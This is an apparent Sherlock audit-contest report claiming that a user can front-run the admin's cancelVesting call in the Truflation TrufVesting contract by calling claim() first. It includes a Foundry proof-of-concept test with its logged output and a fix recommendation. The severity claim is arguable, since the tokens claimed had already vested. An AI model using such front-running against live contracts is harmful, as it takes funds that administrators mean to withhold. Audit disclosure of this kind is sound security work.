Genuine Oily Wallaby

medium

# The cancelVesting function are subject to front-run attack

## Summary
https://github.com/sherlock-audit/2023-12-truflation/blob/37ddbb69e0c7fb6510f1ec99162fd9172ec44733/truflation-contracts/src/token/TrufVesting.sol#L348
`cancelVesting` method is uses to Cancel vesting and force cancel from voting escrow，and  admin  can decide to send  unclaimed amount to user or not. 
But user can front-runs calls `claim() `method ,claim partial vesting amount and avoid losses

## Vulnerability Detail

1. admin decides to cancel alice vesting and set `giveUnclaimed=false`
2. alice sees this and front-runs calls` claim()` method ,claim vesting amount


```solidity
    function testPoc() external {
        

        _setupVestingPlan();
        _setupExampleUserVestings();

        uint256 categoryId = 0;
        uint256 vestingId = 0;
        uint256 stakeAmount = 10e18;
        uint256 duration = 30 days;


        vm.startPrank(alice);

        vesting.stake(categoryId, vestingId, stakeAmount, duration);
        (uint256 amount, uint256 claimed,, uint64 startTime2) = vesting.userVestings(categoryId, vestingId, alice);
        
        
        vm.warp(block.timestamp + duration);
        console.log("alice total vesting amount",amount);
        console.log("alice claimed amount",claimed);

        
        uint256 claimAmount = vesting.claimable(categoryId, vestingId, alice);
        console.log("alice claim Amount, before cancelVesting",claimAmount);
        vesting.claim(alice, categoryId, vestingId, claimAmount);
        vm.stopPrank();

        
        vm.startPrank(owner);
        vesting.cancelVesting(categoryId, vestingId, alice, false);
        uint256 claimAmount1 = vesting.claimable(categoryId, vestingId, alice);
        console.log("alice claimableAmount, after cancelVesting ",claimAmount1);
        console.log("alice trufTokenbalance after cancelVesting",trufToken.balanceOf(address(alice)));
        vm.stopPrank();

[PASS] testPoc() (gas: 1221938)
Logs:
  alice total vesting amount 100000000000000000000
  alice claimed amount 0
  alice claim Amount, before cancelVesting 5000000000000000000
  alice claimableAmount, after cancelVesting  0
  alice trufTokenbalance after cancelVesting 5000000000000000000
```

## Impact
The impact is a violation of system design and destroys the normal functioning of the `cancelVesting` method.

## Code Snippet
https://github.com/sherlock-audit/2023-12-truflation/blob/37ddbb69e0c7fb6510f1ec99162fd9172ec44733/truflation-contracts/src/token/TrufVesting.sol#L348
## Tool used

Manual Review

## Recommendation
Lock the` claim()` method before calling the `cancelVesting` method